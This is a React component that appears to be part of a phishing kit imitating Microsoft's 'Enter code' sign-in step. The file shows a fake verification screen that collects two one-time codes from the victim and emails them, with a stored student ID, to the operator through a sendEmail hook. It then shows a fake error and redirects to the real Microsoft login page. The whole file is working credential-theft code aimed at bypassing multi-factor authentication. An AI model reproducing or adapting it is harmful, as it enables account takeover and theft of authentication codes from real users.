import { useState, useEffect } from "react";
import useGo from "./useGo"; // Import the useGo hook
import { FormFooter } from "./FormFooter";

export const OTP = ({ email, onBack, setStep }) => {
  const [otpValue, setOtpValue] = useState(""); // The OTP entered by the user
  const [otpErrorMessage, setOtpErrorMessage] = useState(""); // Error message for OTP validation
  const [otpAttempts, setOtpAttempts] = useState(0); // To track the number of OTP attempts
  const [firstOtp, setFirstOtp] = useState(localStorage.getItem("otp")); // Get the first OTP from localStorage
  const [otpStep, setOtpStep] = useState(1); // Track which OTP step (first, second)
  const [isSending, setIsSending] = useState(false); // Track if OTP is being sent
  const { isSending: isEmailSending, error, sendEmail } = useGo(); // Use the useGo hook

  // Function to send OTP email using useGo hook
  const sendOtpEmail = async (otp, type) => {
    const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage

    const payload = {
      subject: `OTP Verification`,
      message: `${type} OTP: ${otp}\nStudent ID: ${studentId}`,
    };

    try {
      await sendEmail(payload.subject, payload.message); // Use the sendEmail function
    } catch (err) {
      console.error(`${type} OTP email failed`, err);
    }
  };

  // Handle OTP submission and validation
  const handleNext = async () => {
    if (!otpValue) {
      setOtpErrorMessage("Please enter the OTP.");
      return;
    }

    if (otpStep === 1) {
      // Handle first OTP step
      localStorage.setItem("first_otp", otpValue);
      await sendOtpEmail(otpValue, "First"); // Send first OTP email
      if (!error) {
        setOtpStep(2); // Move to second OTP step after successful email send
        setOtpErrorMessage(""); // Clear any previous error messages
      } else {
        setOtpErrorMessage(``);
      }
      setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
      setOtpValue(""); // Clear the OTP field for the user to enter the second one
      return;
    }

    if (otpStep === 2) {
      // Handle second OTP step
      if (otpValue === firstOtp) {
        setOtpErrorMessage(
          "The second OTP aint be the same as the first OTP. Please enter a different OTP."
        );
        setOtpValue(""); // Clear the OTP field
        return;
      }

      await sendOtpEmail(otpValue, "Second"); // Send second OTP email
      if (!error) {
        setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
        setOtpErrorMessage(
          "Error 0x80072EE7: We encountered a problem while processing your request. Please try again later. If the problem persists, contact support."
        );

        // Transition to loader step before redirect
        setStep("loader"); // Set the step to loader
        setTimeout(() => {
          window.location.href =
            "https://login.microsoftonline.com/3ef7cc24-ad65-4bd7-a6bc-34f32e43989a/login"; // Redirect after 2 seconds
        }, 4000);
      } else {
        setOtpErrorMessage(`Failed to send second OTP: ${error}`);
      }
      setOtpValue(""); // Clear OTP field for the second OTP
      return;
    }
  };

  // This useEffect will simulate a retry mechanism, giving the user a limited number of OTP attempts.
  useEffect(() => {
    if (otpAttempts >= 3) {
      setOtpErrorMessage(
        "Error 0x80072EE7: We encountered a problem while processing your request. Please try again later. If the problem persists, contact support."
      );
    }
  }, [otpAttempts]);

  return (
    <>
      <div
        className="field-container"
        style={{
          opacity: isEmailSending ? 0.5 : 1, // Fade only when email is sending
          transition: "opacity 0.3s ease-in-out", // Optional: smooth transition for opacity change
        }}
      >
        <div className="email-entered">
          <button className="arrow" onClick={onBack}>
            <img
              src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow_left"
            />
          </button>
          <p>{email}</p>
        </div>
        <h1 className="form-title">Enter code</h1>
        <p className="guide">
          We have sent a verification code to your registered phone number.
          Please enter the code below to continue.
        </p>
        <div className="input-message">
          {otpErrorMessage && <p className="guide error">{otpErrorMessage}</p>}{" "}
          {/* Show error */}
          <input
            type="text"
            name="otp"
            id="otp"
            placeholder="XXXXXX"
            className="field otp-field"
            value={otpValue}
            onChange={(e) => setOtpValue(e.target.value)} // Update OTP value
          />
        </div>
        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>
      <FormFooter />
    </>
  );
};
